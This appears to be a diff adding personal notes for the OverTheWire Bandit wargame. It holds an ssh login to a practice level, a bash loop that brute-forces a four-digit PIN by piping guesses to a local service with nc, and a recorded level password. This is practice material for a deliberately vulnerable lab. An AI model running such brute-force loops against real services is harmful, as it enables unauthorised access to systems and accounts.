@@ -1,0 +1,4 @@
+bandit21-ssh bandit.labs.overthewire.org -l bandit21 -p  2220
+for i in {0000..9999}; do echo $i | nc localhost 30002; done
+password shown -iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
+exit
